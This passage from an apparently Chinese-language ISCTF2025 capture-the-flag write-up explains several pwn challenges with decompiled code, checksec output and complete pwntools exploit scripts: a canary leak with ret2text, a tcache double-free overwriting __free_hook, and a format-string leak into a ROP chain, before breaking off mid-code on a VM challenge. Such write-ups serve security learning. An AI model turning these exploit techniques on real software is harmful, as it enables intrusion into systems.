class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一眼看到的是只能执行对应命令，而不是任意命令，第二眼却发现这个函数有栈溢出</p>
<p>可以利用溢出泄露出canary，使用一字节覆盖canary的，这样就可以打印出canary的其他部分</p>
<p>这题还给了gadget，所以得到canary后，利用ret2text很容易就可以getshell</p>
<p>一样是可以在一开始的buf中写入/bin/sh</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0000000000404A40 ; char buf[56]</span><br><span class="line">.bss:0000000000404A40 buf             db 38h dup(?)           ; DATA XREF: main+48↑o</span><br><span class="line">.bss:0000000000404A40                                         ; main+66↑o ...</span><br><span class="line">.bss:0000000000404A40 _bss            ends</span><br><span class="line">.bss:0000000000404A40</span><br></pre></td></tr></table></figure>
<p>exp如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p=start()</span><br><span class="line">pop_rdi_addr=<span class="number">0x40133E</span></span><br><span class="line">call_system_addr=<span class="number">0x401514</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Welcome to ISCTF2025\ninput your name\n&gt;&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;/bin/sh\x00\x00&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Press \&quot;Enter\&quot; to start the game&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.send(<span class="string">b&quot;q\n&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Enter any other characters to start a new round\n&gt;&quot;</span>)</span><br><span class="line">    p.send(<span class="string">b&quot;a\n&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(<span class="string">b&quot;q\n&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Enter any other characters to start a new round\n&gt;&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;Q\n&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;$ &quot;</span>)</span><br><span class="line">payload0=<span class="string">b&quot;a&quot;</span>*<span class="number">0x89</span></span><br><span class="line">p.send(payload0)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;a&quot;</span>*<span class="number">0x89</span>)</span><br><span class="line">canary_leak = p.recvn(<span class="number">7</span>)</span><br><span class="line">canary_bytes = <span class="string">b&#x27;\x00&#x27;</span>+canary_leak</span><br><span class="line">canary = u64(canary_bytes)</span><br><span class="line">log.success(<span class="string">f&quot;完整 canary(8 字节): 0x<span class="subst">&#123;canary:016x&#125;</span>&quot;</span>)</span><br><span class="line">payload=<span class="string">b&quot;exit\x00\x00\x00\x00&quot;</span>+<span class="string">b&quot;\x00&quot;</span>*<span class="number">0x80</span>+p64(canary)+p64(<span class="number">0</span>)+p64(pop_rdi_addr)+p64(<span class="number">0x404A46</span>)+p64(call_system_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ez_tcache_attachment">ez_tcache_attachment</h3>
<p>一道堆题，保护如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> ~/ISCTF/ez_tcache_attachment  checksec ./pwn                                                                                       </span><br><span class="line">[*] &#x27;/home/ubuntu/ISCTF/ez_tcache_attachment/pwn&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    RUNPATH:    b&#x27;./glibc&#x27;</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
<p>经典菜单</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> n2; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  inital(argc, argv, envp);</span><br><span class="line">  welcome();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      n2 = get_int();</span><br><span class="line">      <span class="keyword">if</span> ( n2 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      delete();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( n2 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( n2 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        show();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( n2 == <span class="number">4</span> )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( n2 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>没什么好说的，只有UAF，没有edit函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *n10; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i_1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> size_4; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  i_1 = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !nodes[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      i_1 = i;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( i_1 == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(n10) = <span class="built_in">puts</span>(<span class="string">&quot;Out of space!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">    size = get_int();</span><br><span class="line">    <span class="keyword">if</span> ( size &lt;= <span class="number">0x400</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      nodes[i_1] = <span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">      size_4 = read_n(nodes[i_1], size);</span><br><span class="line">      LODWORD(n10) = *(<span class="type">unsigned</span> __int8 *)((<span class="type">unsigned</span> <span class="type">int</span>)(size_4 - <span class="number">1</span>) + nodes[i_1]);</span><br><span class="line">      <span class="keyword">if</span> ( (_BYTE)n10 == <span class="number">10</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        n10 = (_BYTE *)((<span class="type">unsigned</span> <span class="type">int</span>)(size_4 - <span class="number">1</span>) + nodes[i_1]);</span><br><span class="line">        *n10 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(n10) = <span class="built_in">puts</span>(<span class="string">&quot;Invalid size!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">int</span>)n10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> n0x15; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  n0x15 = get_int();</span><br><span class="line">  <span class="keyword">if</span> ( n0x15 &lt;= <span class="number">0x15</span> &amp;&amp; nodes[n0x15] )</span><br><span class="line">    <span class="built_in">free</span>((<span class="type">void</span> *)nodes[n0x15]);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid index!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> n0x15; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  n0x15 = get_int();</span><br><span class="line">  <span class="keyword">if</span> ( n0x15 &lt;= <span class="number">0x15</span> &amp;&amp; nodes[n0x15] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Content: %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)nodes[n0x15]);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid index!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>glibc版本是2.29，在libc中有检查</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line">	<span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">	tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">	   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">	   2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">	   coincidence before aborting.  */</span></span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">	  &#123;</span><br><span class="line">	    tcache_entry *tmp;</span><br><span class="line">	    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">	    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">		 tmp;</span><br><span class="line">		 tmp = tmp-&gt;next)</span><br><span class="line">	      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">		malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">	    <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">	       few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">	  &#123;</span><br><span class="line">	    tcache_put (p, tc_idx);</span><br><span class="line">	    <span class="keyword">return</span>;</span><br><span class="line">	  &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>最开始就是想打__free_hook，写ogg，但是好像不行，只能用system了</p>
<p>先将tcache填满在放一个到unsortedbin中利用UAF得到libc基址</p>
<p>要在没有edit的情况下修改透过tcache检查进行double free，再进行修改tcache的fd指向__free_hook，申请出来写入system，再free掉一个写着/bin/sh00的堆就可以实现了，这就是最朴素的想法</p>
<p>如何修改fd呢？</p>
<p>我这里利用了前向合并，产生堆块堆叠，合并后再申请回来时写入fd，这样就可以绕过检查，而且可以将物理相邻的下一个堆块的prev_inuse设为1，这样就可以double free了，不过再次之前先从tcache取出一个让double free的堆块进人tcache</p>
<p>注意这里还是有堆块重叠，再将合并的堆块释放，再申请回来，将double free的堆块的fd改为指向`<code>__free_hook</code>，申请两次就可以得到__free_hook所在地址的堆块了，后面就简单了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size, data=<span class="string">b&#x27;&#x27;</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Content: &#x27;</span>, data)  <span class="comment"># 使用sendafter而非sendlineafter，避免添加额外换行符</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">p=start()</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x80</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x80</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x80</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x80</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x20</span>,<span class="string">b&#x27;B&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x80</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x80</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x80</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x80</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x80</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x80</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x80</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">main_arena_addr = u64(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">f&quot;main_arena_addr: <span class="subst">&#123;<span class="built_in">hex</span>(main_arena_addr)&#125;</span>&quot;</span>) </span><br><span class="line">libc_base = main_arena_addr - <span class="number">0x1e4ca0</span></span><br><span class="line">log.success(<span class="string">f&quot;libc_base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line">free_hook_addr = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">f&quot;__free_hook: <span class="subst">&#123;<span class="built_in">hex</span>(free_hook_addr)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;system: <span class="subst">&#123;<span class="built_in">hex</span>(system_addr)&#125;</span>&quot;</span>)</span><br><span class="line">ogg_addr=libc_base+<span class="number">0x106ef8</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x110</span>,<span class="string">b&#x27;B&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(free_hook_addr)*<span class="number">2</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x80</span>,p64(free_hook_addr)*<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x110</span>,<span class="string">b&#x27;B&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(free_hook_addr)*<span class="number">2</span>)</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x80</span>,<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">add(<span class="number">16</span>,<span class="number">0x80</span>,p64(system_addr))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">delete(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ez_fmt">ez_fmt</h3>
<p>保护如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> ~/ISCTF/ez_fmt  checksec ./pwn                                                                                                   </span><br><span class="line">[*] <span class="string">&#x27;/home/ubuntu/ISCTF/ez_fmt/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">136</span>]; <span class="comment">// [rsp+0h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to ISCTF!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;1st input: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100u</span>LL);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n[leak end]\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;2nd input: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x200u</span>LL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Goodbye!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有后门函数，一个简单的ret2text</p>
<p>利用格式化字符串漏洞泄露出canary和elf基址就可以写rop链了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p=start()</span><br><span class="line">p.recvuntil(<span class="string">b&quot;1st input: &quot;</span>)</span><br><span class="line">payload1=<span class="string">b&quot;%23$pa%25$p&quot;</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="built_in">hex</span>(canary))</span><br><span class="line">p.recvuntil(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">elf_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">97</span>-<span class="number">0x12FA</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(elf_addr))</span><br><span class="line">p.recvuntil(<span class="string">b&quot;2nd input: &quot;</span>)</span><br><span class="line">win_addr=elf_addr+<span class="number">0x1202</span></span><br><span class="line">payload2=<span class="string">b&quot;a&quot;</span>*<span class="number">0x88</span>+p64(canary)+p64(<span class="number">0</span>)+p64(win_addr)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="my_vm">my_vm</h3>
<p>第一次写vm题，保护如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> ~/ISCTF/my_vm  checksec ./pwn                                                                                                     </span><br><span class="line">[*] <span class="string">&#x27;/home/ubuntu/ISCTF/my_vm/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
<p>开了沙箱</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> ~/ISCTF/my_vm  seccomp-tools dump ./pwn                                                                                           </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x05 0xc000003e  <span class="keyword">if</span> (A != ARCH_X86_64) goto 0007</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  <span class="keyword">if</span> (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x02 0xffffffff  <span class="keyword">if</span> (A != 0xffffffff) goto 0007</span><br><span class="line"> 0005: 0x15 0x01 0x00 0x0000003b  <span class="keyword">if</span> (A == execve) goto 0007</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br></pre></td></tr></table></figure>
<p>函数如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+Ch] [rbp-1024h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+10h] [rbp-1020h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *ptr; <span class="comment">// [rsp+18h] [rbp-1018h]</span></span><br><span class="line">  _QWORD v9[<span class="number">514</span>]; <span class="comment">// [rsp+20h] [rbp-1010h]</span></span><br><span class="line"></span><br><span class="line">  v9[<span class="number">513</span>] = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v7);</span><br><span class="line">    ptr = (<span class="type">void</span> *)ret_code(v7);</span><br><span class="line">    <span class="keyword">switch</span> ( *(_WORD *)ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        reg[*((__int16 *)ptr + <span class="number">1</span>)] = reg[*((__int16 *)ptr + <span class="number">3</span>)] + reg[*((__int16 *)ptr + <span class="number">2</span>)];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        reg[*((__int16 *)ptr + <span class="number">1</span>)] = reg[*((__int16 *)ptr + <span class="number">2</span>)] - reg[*((__int16 *)ptr + <span class="number">3</span>)];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        reg[*((__int16 *)ptr + <span class="number">1</span>)] = reg[*((__int16 *)ptr + <span class="number">2</span>)] * reg[*((__int16 *)ptr + <span class="number">3</span>)];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        reg[*((__int16 *)ptr + <span class="number">1</span>)] = reg[*((__int16 *)ptr + <span class="number">2</span>)] / reg[*((__int16 *)ptr + <span class="number">3</span>)];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        reg[*((__int16 *)ptr + <span class="number">1</span>)] = reg[*((__int16 *)ptr + <span class="number">2</span>)] &lt;&lt; reg[*((__int16 *)ptr + <span class="number">3</span>)];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        reg[*((__int16 *)ptr + <span class="number">1</span>)] = reg[*((__int16 *)ptr + <span class="number">2</span>)] &gt;&gt; reg[*((__int16 *)ptr + <span class="number">3</span>)];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        reg[*((__int16 *)ptr + <span class="number">1</span>)] = reg[*((__int16 *)ptr + <span class="number">3</span>)] ^ reg[*((__int16 *)ptr + <span class="number">2</span>)];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        v3 = v6++;</span><br><span class="line">        v9[v3] = reg[*((__int16 *)ptr + <span class="number">1</span>)];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !v6 )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        v4 = v6--;</span><br><span class="line">        reg[*((__int16 *)ptr + <span class="number">1</span>)] = 